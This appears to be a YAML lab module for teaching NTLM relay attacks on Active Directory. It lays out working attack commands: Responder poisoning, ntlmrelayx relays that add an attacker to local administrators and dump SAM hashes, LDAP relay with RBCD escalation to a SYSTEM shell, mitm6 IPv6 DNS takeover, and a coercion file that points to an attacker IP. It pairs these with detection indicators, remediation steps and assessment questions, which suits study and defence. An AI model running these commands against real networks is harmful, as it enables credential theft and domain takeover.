@@ -1,0 +1,196 @@
+# Category: Active Directory - Credential Attacks
+name: "NTLM Relay Attack (SMB/HTTP/LDAP)"
+id: "ad-ntlm-relay-001"
+category: "active_directory"
+subcategory: "credential_attacks"
+difficulty: "advanced"
+estimated_time: "90 minutes"
+
+description: |
+  Capture and relay NTLM authentication challenges to authenticate against target
+  services without knowing plaintext credentials. Covers SMB relay, LDAP relay
+  for privilege escalation, and HTTP relay. Requires LLMNR/NBT-NS poisoning or
+  other coercion techniques.
+
+learning_objectives:
+  - Poison LLMNR/NBT-NS to capture NTLM authentication attempts
+  - Relay captured NTLM auth to SMB, LDAP, and HTTP targets
+  - Escalate privileges via LDAP relay (create computer accounts, RBCD)
+  - Detect and mitigate NTLM relay attacks
+
+tools:
+  - responder
+  - ntlmrelayx
+  - crackmapexec
+  - impacket
+  - mitm6
+
+prerequisites:
+  - Network access to target subnet (Layer 2 adjacency preferred)
+  - Valid domain credentials (for some techniques)
+  - Understanding of NTLM authentication and SMB signing
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify targets where SMB signing is disabled"
+    commands:
+      - "# Find hosts with SMB signing disabled (relay targets)"
+      - "crackmapexec smb [target_range] --gen-relay-list /tmp/relay_targets.txt"
+      - "nmap -p445 --script=smb-security-mode [target_range] -oG /tmp/smb_signing.txt"
+      - "grep 'message_signing: disabled' /tmp/smb_signing.txt | awk '{print $2}' > /tmp/unsigned_hosts.txt"
+      - "# Check LDAP signing policy"
+      - "crackmapexec ldap [dc_ip] -u [username] -p [password] --ldap-signing"
+      - "# Check for HTTP endpoints accepting NTLM"
+      - "curl -s -I http://[target_ip]/ | grep -i 'www-authenticate'"
+    expected_output: "List of hosts with SMB signing disabled — valid relay targets"
+    detection: "SMB enumeration scan against multiple hosts in quick succession"
+
+  - id: "step2"
+    phase: "reconnaissance"
+    action: "Setup Responder for LLMNR/NBT-NS poisoning"
+    commands:
+      - "# Disable SMB and HTTP servers in Responder (we use ntlmrelayx for these)"
+      - "sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf"
+      - "sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf"
+      - "# Start Responder"
+      - "responder -I [interface] -rdwv"
+      - "# Monitor for captured hashes"
+      - "tail -f /usr/share/responder/logs/Responder-Session.log"
+    expected_output: "Responder running and capturing NTLM authentication attempts on the network"
+    detection: "Responder sends crafted multicast/broadcast responses; detectable by network monitoring"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "SMB relay to gain shell on target host"
+    commands:
+      - "# Start ntlmrelayx targeting SMB relay hosts"
+      - "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support"
+      - "# Interactive SMB shell"
+      - "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -i"
+      - "# Execute command on relay target"
+      - "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support -c 'net localgroup administrators [attacker_user] /add'"
+      - "# Dump SAM on relay"
+      - "impacket-ntlmrelayx -tf /tmp/relay_targets.txt -smb2support --dump-lm"
+      - "# After interactive shell established, connect via netcat"
+      - "nc 127.0.0.1 11000"
+    expected_output: "Shell on target machine or SAM dump when admin user relayed to target"
+    detection: "SMB auth from unexpected source IP; multiple rapid auth attempts across hosts"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "LDAP relay — create privileged computer account (RBCD attack)"
+    commands:
+      - "# Relay to LDAP — add computer account for RBCD"
+      - "impacket-ntlmrelayx -t ldap://[dc_ip] --delegate-access --escalate-user [low_priv_user]"
+      - "# Or relay to LDAPS"
+      - "impacket-ntlmrelayx -t ldaps://[dc_ip] --delegate-access"
+      - "# After relay, ntlmrelayx creates computer account and sets RBCD"
+      - "# Use S4U2Proxy to impersonate admin on target"
+      - "impacket-getST -spn 'cifs/[target_computer].[domain]' -impersonate Administrator '[domain]/[computer_account]$:[computer_pass]'"
+      - "export KRB5CCNAME=Administrator.ccache"
+      - "impacket-psexec -k -no-pass [domain]/Administrator@[target_computer].[domain]"
+    expected_output: "SYSTEM shell on target computer via RBCD delegation after LDAP relay"
+    detection: "New computer account creation in AD; RBCD delegation attribute set on computer object"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "IPv6 DNS takeover + NTLM relay with mitm6"
+    commands:
+      - "# Start mitm6 for IPv6 DNS poisoning (sends RA with attacker as DNS)"
+      - "mitm6 -d [domain] -i [interface]"
+      - "# In parallel — start ntlmrelayx for LDAP relay"
+      - "impacket-ntlmrelayx -6 -t ldaps://[dc_ip] --delegate-access --add-computer"
+      - "# Wait for machines to query for WPAD via IPv6 DNS"
+      - "# NTLM auth relayed to LDAPS — creates computer account for RBCD"
+      - "# Then proceed with S4U2Proxy as above"
+    expected_output: "Escalation path via IPv6 DNS poisoning → NTLM capture → LDAP relay → RBCD"
+    detection: "IPv6 RA packets from unexpected source; new DNS server in IPv6 DHCP; LDAP computer create"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "HTTP NTLM relay — WebDAV coercion"
+    commands:
+      - "# Check for WebDAV on targets"
+      - "crackmapexec smb [target_range] -u [username] -p [password] -M webdav"
+      - "# Coerce WebDAV auth using searchConnector or similar"
+      - "# Place malicious .searchConnector-ms file"
+      - "cat > /tmp/relay.searchConnector-ms << 'EOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<searchConnectorDescription>\n  <isSearchOnlyItem>false</isSearchOnlyItem>\n  <includeInStartMenuScope>false</includeInStartMenuScope>\n  <templateInfo/>\n  <simpleLocation>\n    <url>https://[attacker_ip]/relay</url>\n  </simpleLocation>\n</searchConnectorDescription>\nEOF"
+      - "# ntlmrelayx targeting LDAP via HTTP relay"
+      - "impacket-ntlmrelayx -t ldap://[dc_ip] --delegate-access -smb2support"
+    expected_output: "NTLM auth captured via HTTP/WebDAV and relayed to LDAP"
+    detection: "WebDAV authentication to external IP; outbound HTTP NTLM auth from workstations"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1557.001"
+    description: "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay"
+  - standard: "NIST 800-53 Rev5"
+    control: "SC-8"
+    description: "Transmission confidentiality and integrity"
+  - standard: "CIS Controls v8"
+    control: "4.1"
+    description: "Establish and maintain a secure network architecture"
+  - standard: "PCI DSS v4.0"
+    control: "4.2.1"
+    description: "Strong cryptography for data in transit"
+
+detection:
+  network_indicators:
+    - "LLMNR/NBT-NS responses from unexpected host on network"
+    - "Multiple rapid NTLM authentication attempts to SMB targets"
+    - "IPv6 Router Advertisement from non-router host"
+    - "SMB authentication originating from Responder host"
+  log_indicators:
+    - "Event ID 4625: Failed NTLM auth followed by 4624 success from different IP"
+    - "Event ID 4741: New computer account created (RBCD attack)"
+    - "AD attribute msDS-AllowedToActOnBehalfOfOtherIdentity modified"
+    - "Event ID 4776: Credential validation for relayed account"
+  endpoint_indicators:
+    - "Responder/ntlmrelayx execution on attacker host"
+    - "Unexpected computer account creation in AD"
+
+remediation:
+  immediate:
+    - "Enable SMB signing on ALL systems (not just domain controllers)"
+    - "Disable LLMNR via Group Policy: Computer Config > Admin Templates > Network > DNS Client"
+    - "Disable NBT-NS in network adapter settings via GPO"
+    - "Enable LDAP signing and channel binding on domain controllers"
+  long_term:
+    - "Disable NTLMv1 — enforce NTLMv2 minimum"
+    - "Move to Kerberos authentication everywhere possible"
+    - "Enable Extended Protection for Authentication (EPA) on IIS/Exchange"
+    - "Block IPv6 if not used in environment (prevents mitm6)"
+    - "Deploy network-level detection for LLMNR/mDNS poisoning"
+
+variables:
+  target_range: "192.168.1.0/24"
+  dc_ip: "192.168.1.10"
+  target_ip: "192.168.1.50"
+  target_computer: "WORKSTATION01"
+  interface: "eth0"
+  domain: "corp.example.com"
+  username: "jsmith"
+  password: "Password123"
+  attacker_ip: "192.168.1.200"
+  low_priv_user: "jsmith"
+  attacker_user: "jsmith"
+  computer_account: "ATTACKERPC$"
+  computer_pass: "RandomPass123!"
+
+assessment_questions:
+  - "Why must SMB signing be disabled on the relay target for NTLM relay to succeed?"
+  - "How does RBCD (Resource-Based Constrained Delegation) enable privilege escalation via LDAP relay?"
+  - "What is the difference between NTLM relay and Pass-the-Hash?"
+  - "How does mitm6 enable NTLM relay attacks without LLMNR?"
+  - "Why should LDAP signing and channel binding be enabled together?"
+
+references:
+  - url: "https://github.com/lgandx/Responder"
+    title: "Responder - LLMNR/NBT-NS Poisoner"
+  - url: "https://github.com/fortra/impacket"
+    title: "Impacket ntlmrelayx"
+  - url: "https://github.com/dirkjanm/mitm6"
+    title: "mitm6 - IPv6 DNS Takeover"
+  - url: "https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/"
+    title: "NTLM Relaying and Kerberos Delegation"
